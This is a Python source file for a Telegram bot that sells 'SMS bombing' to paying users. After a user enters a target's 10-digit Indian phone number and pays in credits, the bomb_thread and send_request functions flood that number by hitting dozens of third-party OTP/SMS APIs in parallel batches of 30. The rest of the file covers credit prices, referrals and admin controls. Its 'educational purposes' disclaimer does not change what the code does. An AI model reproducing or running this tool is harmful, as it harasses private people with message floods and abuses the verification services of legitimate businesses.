#!/usr/bin/env python
# (c) @lordzenox | @zenoxtool | @ghostpyo

import os, sys, json, time, threading, random, logging, requests, concurrent.futures
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

from config import *
from database import *

# Disable logging
logging.basicConfig(level=logging.ERROR)
sys.stderr = open(os.devnull, 'w')

# Globals
stop_bombing = {}
total_requests = {}
current_target = {}

# ---------- LOAD SERVICES (SAME API) ----------
def load_services():
    try:
        with open('services.json', 'r') as f:
            data = json.load(f)
            return data.get('services', [])
    except:
        return []

SERVICES = load_services()
print(f"✅ Loaded {len(SERVICES)} services")

# ---------- BOMBING ENGINE (SPEED OPTIMIZED) ----------
def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91":
        return f"+91{p}"
    if fmt == "91-":
        return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc.get('method', 'POST').upper()
    url = svc.get('url', '').replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    
    if data:
        if '_raw' in data:
            raw = data['_raw'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
            try:
                import ast
                data = ast.literal_eval(raw)
            except:
                pass
        else:
            data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=2)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=2)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb_thread(phone, total, user_id):
    global stop_bombing, total_requests
    total_requests[user_id] = 0
    services = SERVICES.copy()
    random.shuffle(services)
    
    sent = 0
    success = 0
    failed = 0
    
    def send_one(svc):
        try:
            return send_request(svc, phone)
        except:
            return False
    
    while sent < total and not stop_bombing.get(user_id, False):
        # 🔥 30 APIs ek saath parallel mein
        batch_size = 30
        batch = services[:batch_size]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            results = executor.map(send_one, batch)
            for ok in results:
                if stop_bombing.get(user_id, False) or sent >= total:
                    break
                if ok:
                    success += 1
                else:
                    failed += 1
                sent += 1
                total_requests[user_id] = sent
                if sent >= total:
                    break
        
        random.shuffle(services)
        time.sleep(0.005)  # 🔥 Delay 0.01 se 0.005 karo
    
    add_bomb_stats(user_id, phone, sent, success, failed)
    return sent, success, failed

# ---------- MAIN MENU ----------
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if not get_user(user_id):
        created, msg = create_user(user_id, user.username or user.first_name, user.first_name)
        if not created:
            await update.message.reply_text("❌ Error creating user.")
            return
    
    stats = get_user_stats(user_id)
    coins = get_balance(user_id)
    ref_count = get_referral_count(user_id)
    
    msg = f"""🔥 **{BOT_NAME}**
💀 **SMS BLAST BOT {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)} FIREBASE(S)**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channel:** {CHANNEL1}

💀 **TAP SEND SMS TO START**"""

    keyboard = [
        [InlineKeyboardButton("💣 SEND SMS", callback_data="send_sms")],
        [InlineKeyboardButton("📹 VIDEOS", callback_data="videos"),
         InlineKeyboardButton("💰 CREDITS", callback_data="credits")],
        [InlineKeyboardButton("🎁 REDEEM", callback_data="redeem"),
         InlineKeyboardButton("🔗 REFER", callback_data="refer")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats"),
         InlineKeyboardButton("📜 MY SMS HISTORY", callback_data="history")],
        [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy_credits"),
         InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await main_menu(update, context)

# ---------- MESSAGE HANDLER ----------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if context.user_data.get('waiting_for') == 'bomb_number':
        target = update.message.text.strip()
        
        if len(target) != 10 or not target.isdigit():
            await update.message.reply_text("❌ Invalid number! Please enter a 10-digit number.")
            return
        
        context.user_data['waiting_for'] = None
        
        coins = get_balance(user_id)
        if coins < BOMB_COST:
            await update.message.reply_text(f"❌ Insufficient credits!\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}")
            return
        
        if not deduct_coins(user_id, BOMB_COST, f"Bomb on +91{target}"):
            await update.message.reply_text("❌ Failed to deduct credits.")
            return
        
        stop_bombing[user_id] = False
        current_target[user_id] = target
        
        await update.message.reply_text(
            f"✅ **SMS Bombing Started on +91{target}!**\n"
            f"📊 APIs: {len(SERVICES)}\n"
            f"💰 Credits Left: {get_balance(user_id)}\n"
            f"🛑 Type /stop to halt.",
            parse_mode="Markdown"
        )
        
        def run_bomb():
            sent, success, failed = bomb_thread(target, MAX_SMS_PER_BOMB, user_id)
            if stop_bombing.get(user_id, False):
                update.message.reply_text(
                    f"⛔ **Stopped!**\n📱 +91{target}\n📊 Sent: {sent}\n✅ Success: {success}\n❌ Failed: {failed}",
                    parse_mode="Markdown"
                )
            else:
                update.message.reply_text(
                    f"✅ **Complete!**\n📱 +91{target}\n📊 Sent: {sent}\n✅ Success: {success}\n❌ Failed: {failed}",
                    parse_mode="Markdown"
                )
        
        threading.Thread(target=run_bomb, daemon=True).start()

# ---------- CALLBACK HANDLER ----------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await query.edit_message_text("🚫 You are banned.")
        return
    
    data = query.data
    
    if data == "send_sms":
        await query.edit_message_text(
            "📱 **Enter Target Number**\n\n"
            "Send the 10-digit phone number.\n\n"
            "Example: `9876543210`\n\n"
            "⏳ You have 60 seconds to reply.",
            parse_mode="Markdown"
        )
        context.user_data['waiting_for'] = 'bomb_number'
    
    elif data == "videos":
        await query.edit_message_text(
            f"📹 **Video Tutorials**\n\n"
            f"📢 More videos on channel:\n{CHANNEL1}",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
    
    elif data == "credits":
        coins = get_balance(user_id)
        stats = get_user_stats(user_id)
        ref_count = get_referral_count(user_id)
        
        msg = f"""💰 **Your Credits**

💳 **Balance:** {coins} credits
💣 **Bombs Used:** {stats['total_bombs']}
📱 **SMS Sent:** {stats['total_sms']}
👤 **Referrals:** {ref_count}
🎁 **Bonus Earned:** {ref_count * REFERRAL_BONUS}"""
        
        keyboard = [
            [InlineKeyboardButton("🔗 Refer & Earn", callback_data="refer")],
            [InlineKeyboardButton("💳 Buy Credits", callback_data="buy_credits")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "refer":
        ref_code = get_referral_code(user_id)
        if not ref_code:
            await query.edit_message_text("❌ Error getting referral code.")
            return
        
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={ref_code}"
        ref_count = get_referral_count(user_id)
        
        msg = f"""🔗 **Refer & Earn**

👤 **Your Referral Link:**
`{ref_link}`

📊 **Total Referrals:** {ref_count}
💰 **Coins Earned:** {ref_count * REFERRAL_BONUS}"""
        
        keyboard = [
            [InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=🔥 Join {BOT_NAME}!")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "stats":
        stats = get_user_stats(user_id)
        coins = get_balance(user_id)
        
        msg = f"""📊 **Your Statistics**

👑 **Role:** {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
💰 **Credits:** {coins}
💣 **Total Bombs:** {stats['total_bombs']}
📱 **SMS Sent:** {stats['total_sms']}
📡 **APIs:** {len(SERVICES)}
👤 **Referrals:** {get_referral_count(user_id)}"""
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "history":
        logs = get_bomb_logs(user_id)
        if not logs:
            await query.edit_message_text("📜 **No SMS History**")
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
            await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
            return
        
        msg = "📜 **My SMS History**\n\n"
        for target, sms, success, failed, date in logs[:5]:
            date_short = date[:16]
            msg += f"📱 +91{target}\n   📊 {sms} SMS | ✅ {success}\n   🕐 {date_short}\n\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "buy_credits":
        msg = f"""💳 **Buy Credits**

👤 **Owner:** {OWNER}

💎 **Credit Prices:**
• **20 credits** - ₹40
• **50 credits** - ₹100
• **100 credits** - ₹190
• **250 credits** - ₹450
• **500 credits** - ₹850
• **1000 credits** - ₹1600
• **2500 credits** - ₹3750
• **5000 credits** - ₹7000

📩 Click below to contact owner!"""
        
        keyboard = [
            [InlineKeyboardButton("👤 Contact Owner", url="https://t.me/lordzenox")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "transfer":
        await query.edit_message_text(
            "🔄 **Transfer Credits**\n\n"
            "Usage: `/transfer <user_id> <amount>`",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
    
    elif data == "info":
        msg = f"""ℹ️ **About {BOT_NAME}**

💀 **Version:** {BOT_VERSION}
👑 **Owner:** {OWNER}
📡 **APIs:** {len(SERVICES)}
📢 **Channel:** {CHANNEL1}

⚠️ **Disclaimer:**
For educational purposes only."""
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    
    elif data == "back_main":
        await main_menu_callback(query, user_id)

async def main_menu_callback(query, user_id):
    user = get_user(user_id)
    stats = get_user_stats(user_id)
    coins = get_balance(user_id)
    
    if not user:
        await query.edit_message_text("❌ Please use /start")
        return
    
    msg = f"""🔥 **{BOT_NAME}**
💀 **SMS BLAST BOT {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)} FIREBASE(S)**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channel:** {CHANNEL1}

💀 **TAP SEND SMS TO START**"""

    keyboard = [
        [InlineKeyboardButton("💣 SEND SMS", callback_data="send_sms")],
        [InlineKeyboardButton("📹 VIDEOS", callback_data="videos"),
         InlineKeyboardButton("💰 CREDITS", callback_data="credits")],
        [InlineKeyboardButton("🎁 REDEEM", callback_data="redeem"),
         InlineKeyboardButton("🔗 REFER", callback_data="refer")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats"),
         InlineKeyboardButton("📜 MY SMS HISTORY", callback_data="history")],
        [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy_credits"),
         InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_bombing[user_id] = True
    await update.message.reply_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/redeem <code>`", parse_mode="Markdown")
        return
    code = context.args[0]
    success, msg = use_redeem_code(user_id, code)
    await update.message.reply_text(msg, parse_mode="Markdown")

async def transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/transfer <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    success, msg = transfer_coins(user_id, target_id, amount)
    await update.message.reply_text(msg, parse_mode="Markdown")

# ---------- ADMIN COMMANDS ----------
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    stats = get_total_stats()
    msg = f"""🔐 **Admin Panel**

📊 Users: {stats['users']}
💰 Credits: {stats['coins']}
💣 Bombs: {stats['bombs']}
📱 SMS: {stats['sms']}
📡 APIs: {len(SERVICES)}

/addcoins <id> <amount>
/broadcast <msg>
/ban <id>
/unban <id>
/statsall
/createcode <code> <amount>"""
    await update.message.reply_text(msg, parse_mode="Markdown")

async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    add_coins(target_id, amount, f"Admin added {amount} credits")
    await update.message.reply_text(f"✅ Added **{amount}** credits to `{target_id}`", parse_mode="Markdown")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    message = " ".join(context.args)
    users = get_all_users()
    sent = 0
    for uid, username, coins, bombs, sms in users:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            sent += 1
            time.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

async def statsall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    stats = get_total_stats()
    msg = f"""📊 **Full Statistics**

👤 Users: {stats['users']}
💰 Credits: {stats['coins']}
💣 Bombs: {stats['bombs']}
📱 SMS: {stats['sms']}
📡 APIs: {len(SERVICES)}
👑 Owner: {OWNER}"""
    await update.message.reply_text(msg, parse_mode="Markdown")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id!")
        return
    ban_user(target_id)
    await update.message.reply_text(f"🚫 User `{target_id}` banned.", parse_mode="Markdown")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id!")
        return
    unban_user(target_id)
    await update.message.reply_text(f"✅ User `{target_id}` unbanned.", parse_mode="Markdown")

async def createcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/createcode <code> <amount>`", parse_mode="Markdown")
        return
    code = context.args[0]
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid amount!")
        return
    create_redeem_code(code, amount, user_id)
    await update.message.reply_text(f"✅ Redeem code `{code}` created!", parse_mode="Markdown")

# ---------- MAIN ----------
def main():
    make_admin(ADMIN_ID)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("transfer", transfer))
    
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("addcoins", addcoins))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("statsall", statsall))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("createcode", createcode))
    
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 50)
    print(f"🤖 {BOT_NAME} (SPEED OPTIMIZED - API SAME)")
    print(f"📊 Loaded {len(SERVICES)} APIs")
    print(f"👑 Owner: {OWNER}")
    print("=" * 50)
    app.run_polling()

if __name__ == "__main__":
    main()
